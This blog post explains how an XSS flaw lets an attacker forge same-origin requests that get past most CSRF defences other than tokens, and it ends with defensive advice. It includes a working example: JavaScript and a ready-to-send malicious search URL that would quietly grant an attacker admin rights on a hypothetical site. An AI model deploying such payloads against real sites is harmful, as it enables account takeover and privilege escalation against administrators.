---
layout:     post
title:      "Exploiting XSS With Same-Origin Request Forgery"
date:       2017-07-19
summary:    "One of the seldom discussed weaknesses in many cross-site request forgery mitigations is the fact that you can still forge these requests on the same origin."
---
Before we begin, some of the things I will be talking about in this article include:
* [Cross-Site Scripting (XSS)](https://www.owasp.org/index.php/Cross-site_Scripting_%28XSS%29)
* [Cross-Site Request Forgery (CSRF)](https://www.owasp.org/index.php/Cross-Site_Request_Forgery_%28CSRF%29)
* [Cross-Origin Resource Sharing (CORS)](https://developer.mozilla.org/en-US/docs/Web/HTTP/Access_control_CORS)

If you are not familiar with these concepts, you may want to do some reading and understand what they are. I've included some links as starting points. If you already know what all of them are, then read on.

Today I'll be talking about a weakness that exists in a large number of CSRF mitigations: They can be circumvented with XSS. Let's do a quick run down of the many forms on CSRF mitigations, and how they work.

The following can be used to guard against CSRF:
* A CSRF token
* Referer header validation
* SameSite cookies
* Custom request headers
* Non-basic content types
* Non-basic request methods

CSRF tokens involve randomly generating a value and including it in a request parameter or request header. When the server receives the request, it checks to see if the CSRF token that it receives is the same as the one that it gave to the client. If it isn't, then it rejects the request. This is effective because, if properly implemented, the value of the randomly generated token can't be guessed or forged by an attacker.

Referer header validation is checking the value of the referer request header to make sure that the request originates from the same domain. This is currently considered to be an acceptable form of CSRF protection. However, there have been browser bugs in the past which allowed an attacker to spoof the referer header.

[SameSite](https://www.owasp.org/index.php/SameSite) is a relatively new type of cookie flag which causes cookies to only be included on requests that originate from the same domain. This protection is rarely used, and it can cause a negative impact on the user experience because links that you click from a different site or paste in your address bar will not use cookies.

Custom request headers, non-basic content types, and non-basic request methods are all protected by [CORS](https://developer.mozilla.org/en-US/docs/Web/HTTP/Access_control_CORS). The "Simple Requests" section of the linked document details the type of requests that are allowed to be sent cross-origin without triggering CORS. If you use a non-basic method or header, then your browser must send a pre-flighted OPTIONS request to check if it is allowed to send the request (You can allow sites to circumvent CORS with the Access-Control-Allow-Origin header). [This write-up](https://github.com/dxa4481/CORS) from a couple weeks ago talks about how CORS protections aren't always reliable. Chromium had [a bug which was open for two years](https://bugs.chromium.org/p/chromium/issues/detail?id=490015) that enabled attackers to CSRF JSON content-types, and Chromium devs didn't understand why that was an issue.

All of these methods except the CSRF token are flawed in that they are protected by the same-origin policy. An attacker exploiting an XSS vulnerability can therefore circumvent them.

Here's an example attack scenario. Suppose that your application has two privilege levels: admins and users. Admins have the ability to grant users administrative privileges using an admin panel. The request to change a user's privilege level looks like this:  
```
PUT /admin/users HTTP/1.1
Host: example.com
Referer: https://example.com/admin/users
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36
Cookie: sess_id=b004254d5968eed72ca7574873d0153dc188c95babdac4169d22f7c0
Content-type: application/json

{"userId": 35742, "role": "admin"}
```

Suppose also that elsewhere on your application is an XSS vulnerability. An attacker could inject the following JavaScript to make the admin request:  
{% highlight javascript %}
x = new XMLHttpRequest;
x.open('PUT', '/admin/users', true);
x.setRequestHeader('Content-Type', 'application/json');
x.send('{"userId": 35742, "role": "admin"}');
{% endhighlight %}

Let's suppose that this vulnerability exists on the search function. An attacker could send an admin user the following link:
`https://example.com/search?q=<script>x=new+XMLHttpRequest;x.open('PUT','/admin/users',true);x.setRequestHeader('Content-Type','application/json');x.send('{"userId":35742,"role":"admin"}');</script>`

Encodings could be used to obfuscate the URL and make what is does less obvious. Then, when the admin opens the link, the request is sent and the attacker's account privileges are elevated to admin.

This is nothing new or innovative, but it's something that should be kept in mind when evaluating the threat of XSS, which tends to be underestimated by those who do not understand its full capabilities. Additionally, CORS alone should not be relied upon for CSRF protection. Browser bugs can leave you vulnerable, so it's best to program your application to defend itself instead of relying on browser protections. 
